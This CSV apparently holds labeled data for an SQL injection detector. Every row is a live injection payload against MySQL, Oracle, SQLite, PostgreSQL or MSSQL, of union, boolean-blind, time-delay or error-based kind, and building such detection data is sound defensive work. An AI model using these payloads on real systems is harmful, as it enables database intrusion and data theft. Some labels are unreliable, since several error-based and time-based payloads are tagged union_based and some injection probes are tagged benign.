id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
22960,"iif ( 8213 = 4718,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 25 chars.,2
22967,"-9577'|| ( select 'vloa' from dual where 7184 = 7184 union all select 7184,7184#",union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,2
22800,"-4802 union all select 7381,7381,7381,7381,7381,7381,7381,7381,7381,7381--",union_based,generic,0.7,UNION-based payload detected. Payload length: 74 chars.,2
22803,-2784 ) where 5261 = 5261 or 3472 = 1728#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 41 chars.,2
22810,"1' ) as xhmm where 8092 = 8092 union all select null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 64 chars.,2
22812,"-5989%"" union all select 3581,3581,3581,3581,3581--",union_based,generic,0.7,UNION-based payload detected. Payload length: 51 chars.,2
22814,"-9078 union all select 3779,3779,3779,3779,3779,3779,3779,3779--",union_based,generic,0.7,UNION-based payload detected. Payload length: 64 chars.,2
22828,-4001' ) ) or 5634 = 4044--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 27 chars.,2
22830,"-5643' ) ) union all select 1515,1515#",union_based,generic,0.7,UNION-based payload detected. Payload length: 38 chars.,2
22832,"1 ) union all select null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 52 chars.,2
22833,"-4826 union all select 4532,4532,4532,4532,4532--",union_based,generic,0.7,UNION-based payload detected. Payload length: 49 chars.,2
22835,"1'|| ( select 'xbwg' where 7518 = 7518 union all select null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 87 chars.,2
22840,"-9382' ) union all select 4774,4774,4774,4774--",union_based,generic,0.7,UNION-based payload detected. Payload length: 47 chars.,2
22841,-3752%' union all select 9351--,union_based,generic,0.7,UNION-based payload detected. Payload length: 31 chars.,2
22846,"-8929' union all select 5324,5324,5324,5324,5324,5324--",union_based,generic,0.7,UNION-based payload detected. Payload length: 55 chars.,2
22848,-2372' or 1783 = 2656,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2
22854,"-5606 ) union all select 7118,7118,7118,7118,7118,7118,7118,7118,7118#",union_based,generic,0.7,UNION-based payload detected. Payload length: 70 chars.,2
22856,"-9240' union all select 6538,6538,6538#",union_based,generic,0.7,UNION-based payload detected. Payload length: 39 chars.,2
22862,-7663' ) ) or 1558 = 1104 and ( ( 'wsrq' = 'wsrq,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 48 chars.,2
22863,1 ) ) as rvex where 3462 = 3462 and 4595 = 4595#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 48 chars.,2
22865,"1%' ) ) ) union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 78 chars.,2
22867,"-6357"" ) union all select 9767,9767,9767,9767,9767,9767,9767,9767,9767#",union_based,generic,0.7,UNION-based payload detected. Payload length: 71 chars.,2
22868,1' ) where 5680 = 5680 and ( 3020 = 3020 ) *6703--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 50 chars.,2
22870,"1 ) ) as jmcp where 8624 = 8624 union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 100 chars.,2
22872,"-8794 ) ) ) union all select 5802,5802,5802--",union_based,generic,0.7,UNION-based payload detected. Payload length: 45 chars.,2
22878,"-3997'+ ( select 'avjk' where 1917 = 1917 union all select 1917,1917,1917--",union_based,generic,0.7,UNION-based payload detected. Payload length: 75 chars.,2
22879,"-1722' union all select 1408,1408,1408#",union_based,generic,0.7,UNION-based payload detected. Payload length: 39 chars.,2
22889,1' ) ) and 7533 = 7533 and ( ( 'gvoh' = 'gvoh,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 45 chars.,2
22903,"-4770 ) ) ) union all select 6356,6356,6356,6356,6356#",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,2
22908,"1%' ) ) ) union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 77 chars.,2
22910,"-3699%' ) ) ) union all select 8241,8241,8241,8241,8241,8241,8241,8241,8241#",union_based,generic,0.7,UNION-based payload detected. Payload length: 76 chars.,2
22916,"1%"" ) union all select null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,2
22919,"1"" where 7290 = 7290 union all select null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 74 chars.,2
22920,"1 ) as zdym where 1578 = 1578 union all select null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 62 chars.,2
22921,"1' ) ) union all select null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 60 chars.,2
22923,1' ) and 2305 = 1934,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 20 chars.,2
22930,"-2899"" ) ) as uyoc where 8417 = 8417 union all select 8417,8417,8417,8417--",union_based,generic,0.7,UNION-based payload detected. Payload length: 75 chars.,2
22935,"-5014%"" ) ) ) or 3348 = 2430--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 30 chars.,2
22936,"1' ) ) ) union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 76 chars.,2
22939,1' ) as ibaw where 2130 = 2130 and 9198 = 9198--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 48 chars.,2
22952,1' ) ) ) and 1743 = 6793 and ( ( ( 'rgcv' = 'rgcv,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 49 chars.,2
22965,1' and 7533 = 7533,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 18 chars.,2
22966,-4775' ) or 3038 = 3038,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2
22969,-6327' ) ) union all select 2685--,union_based,generic,0.7,UNION-based payload detected. Payload length: 34 chars.,2
22973,1' ) as epgz where 2898 = 2898 and 7028 = 2287#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 47 chars.,2
22976,"1"" ) ) union all select null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 30 chars.,2
22978,-5970' where 2769 = 2769 union all select 2769--,union_based,generic,0.7,UNION-based payload detected. Payload length: 48 chars.,2
22979,"1 where 4944 = 4944 union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 82 chars.,2
22993,"1%' ) union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 73 chars.,2
22805,"1"" ) rlike sleep ( 5 ) and ( ""rfsd"" = ""rfsd",time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1
22813,"1"" and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
22817,"1' where 7190 = 7190 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
22837,"1%"" or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ""%"" = """,boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
22844,"1"" ) where 6679 = 6679 rlike sleep ( 5 ) #",time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1
22884,1' ) ) as nsfx where 9553 = 9553 rlike sleep ( 5 ) --,time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1
22893,"1' ) ) as xjen where 6791 = 6791 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
22901,"1' ) ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'tvar' = 'tvar",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
22938,"1 ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( 5336 = 5336",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
22964,"1%' ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( '%' = '",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
22980,"1 ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 8867 = 8867",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
22983,"1%' ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
22984,"1' ) ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
22986,"1' ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
22991,"1"" ) ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
22996,"1' and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and 'imqi' = 'imqi",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
22998,"1"" and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ""fqeu"" like ""fqeu",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
22859,"1%"" ) ) or sleep ( 5 ) and ( ( ""%"" = """,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
22873,"1%"" or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ""%"" = """,time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
22902,1%' ) and sleep ( 5 ) and ( '%' = ',time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
22907,1 ) where 1333 = 1333 order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 34 chars.,1
22974,"1%"" ) ) and sleep ( 5 ) and ( ( ""%"" = """,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
22804,"1"" ) ) ) and ( 3020 = 3020 ) *6703 and ( ( ( ""fqap"" like ""fqap",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 62 chars.,1
22809,1 and ( 1977 = 6852 ) *6852-- clxl,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 34 chars.,1
22847,end and 'aenf' = 'aenf,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,1
22852,"-3782%"" ) or make_set ( 9354 = 9354,7185 ) and ( ""%"" = """,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 56 chars.,1
22866,1' ) ) ) and ( 3020 = 3020 ) *6703 and ( ( ( 'nhrc' like 'nhrc,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 62 chars.,1
22875,"-3228"" ) or ( 5901 = 1570 ) *1570 and ( ""egdd"" = ""egdd",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 54 chars.,1
22915,"1"" ) and ( 3020 = 3020 ) *6703 and ( ""qowc"" like ""qowc",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 54 chars.,1
22962,"1' ) ) and make_set ( 8403 = 8403,8899 ) and ( ( 'bmsa' = 'bmsa",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 63 chars.,1
22864,1' ) where 4500 = 4500,benign,generic,0.5,. Payload length: 22 chars.,1
22874,"1"" ) ) as nhus where 3689 = 3689",benign,generic,0.5,. Payload length: 32 chars.,1
22885,1 where 3744 = 3744,benign,generic,0.5,. Payload length: 19 chars.,1
22887,"1"" ) as eaxo where 2728 = 2728",benign,generic,0.5,. Payload length: 30 chars.,1
22917,1' ) ) as tcby where 5213 = 5213,benign,generic,0.5,. Payload length: 32 chars.,1
22994,1' ) as wjty where 2971 = 2971,benign,generic,0.5,. Payload length: 30 chars.,1
22999,1' where 7613 = 7613,benign,generic,0.5,. Payload length: 20 chars.,1
22801,1' ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 'uwbt' like 'uwbt,union_based,mssql,1.0,"Signals: 'char', 'case'; UNION-based payload detected; DB: mssql",0
22807,1%' ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( '%' = ',union_based,mysql,1.0,"Signals: 'sleep', 'rlike'; UNION-based payload detected; DB: mysql",0
22811,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) -- ygbf",union_based,sqlite,1.0,"Signals: 'randomblob', 'hex'; UNION-based payload detected; DB: sqlite",0
22819,"1'|| ( select 'mjkz' where 9430 = 9430 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) ) ||'",union_based,generic,1.0,"Signals: 'substring', 'substr', 'char'; UNION-based payload detected",0
22820,"1'+ ( select blbd where 7451 = 7451 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) ) +'",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'char'; UNION-based payload detected; DB: mysql",0
22822,"1 ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( 3038 = 3038",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'if'; UNION-based payload detected; DB: mysql",0
22823,"1' ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 'rvwk' = 'rvwk",union_based,oracle,1.0,"Signals: 'chr', 'case', 'ctxsys'; UNION-based payload detected; DB: oracle",0
22825,"1'|| ( select 'scqw' where 3337 = 3337 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",union_based,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; UNION-based payload detected; DB: oracle",0
22826,1' where 6003 = 6003 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --,union_based,mysql,1.0,"Signals: 'rlike', 'case'; UNION-based payload detected; DB: mysql",0
22829,"1%"" ) ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( ( ""%"" = """,union_based,generic,1.0,"Signals: 'substring', 'substr', 'char'; UNION-based payload detected",0
22834,1' in boolean mode ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) #,union_based,oracle,1.0,"Signals: 'xmltype', 'chr', 'case'; UNION-based payload detected; DB: oracle",0
22853,1' ) ) as eltx where 9955 = 9955 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,union_based,generic,1.0,"Signals: 'elt', 'chr', 'cast'; UNION-based payload detected",0
22855,select pg_sleep ( 5 ) and ( 'itgc' = 'itgc,union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
22858,"1' ) where 9381 = 9381 or elt ( 6272 = 6272,sleep ( 5 ) ) --",time_blind,mysql,1.0,"Signals: 'elt', 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql",0
22871,"1"" or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ""bkrk"" = ""bkrk",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'char'; UNION-based payload detected; DB: mysql",0
22880,-1940 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ),union_based,generic,1.0,"Signals: 'chr', 'cast', 'case'; UNION-based payload detected",0
22881,1'|| ( select 'npdx' from dual where 9486 = 9486 and sleep ( 5 ) ) ||',union_based,mysql,1.0,"Signals: 'sleep', 'dual'; UNION-based payload detected; DB: mysql",0
22883,"1' and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 )",union_based,mysql,1.0,"Signals: 'updatexml', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
22886,"1, ( select 6825 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6825 = 6825,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'char'; UNION-based payload detected; DB: mysql",0
22888,"1"" ) ) as tsry where 6594 = 6594 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",union_based,mysql,1.0,"Signals: 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
22890,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( ""vfvh"" = ""vfvh",union_based,oracle,1.0,"Signals: 'dbms_pipe', 'chr', 'dual'; UNION-based payload detected; DB: oracle",0
22892,-3501' ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 'spvx' = 'spvx,union_based,oracle,1.0,"Signals: 'chr', 'case', 'dual'; UNION-based payload detected; DB: oracle",0
22894,"1"" ) ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( ""sdvu"" like ""sdvu",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'exp'; UNION-based payload detected; DB: mysql",0
22897,"1' ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( 'mttj' like 'mttj",union_based,mysql,1.0,"Signals: 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
22898,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( ""%"" = """,union_based,sqlite,1.0,"Signals: 'randomblob', 'hex'; UNION-based payload detected; DB: sqlite",0
22899,"1"" where 3274 = 3274 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'char'; UNION-based payload detected; DB: mysql",0
22905,select ( case when ( 6969 = 5797 ) then 6969 else 6969* ( select 6969 from information_schema.character_sets ) end ) #,union_based,mssql,1.0,"Signals: 'char', 'case', 'information_schema'; UNION-based payload detected; DB: mssql",0
22906,1%' ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( '%' = ',union_based,oracle,1.0,"Signals: 'chr', 'case', 'utl_inaddr'; UNION-based payload detected; DB: oracle",0
22912,"1 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 )",union_based,mysql,1.0,"Signals: 'updatexml', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
22924,"1' in boolean mode ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) #",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'if'; UNION-based payload detected; DB: mysql",0
22926,"1' ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and 'hqqj' = 'hqqj",union_based,generic,1.0,"Signals: 'substring', 'substr', 'char'; UNION-based payload detected",0
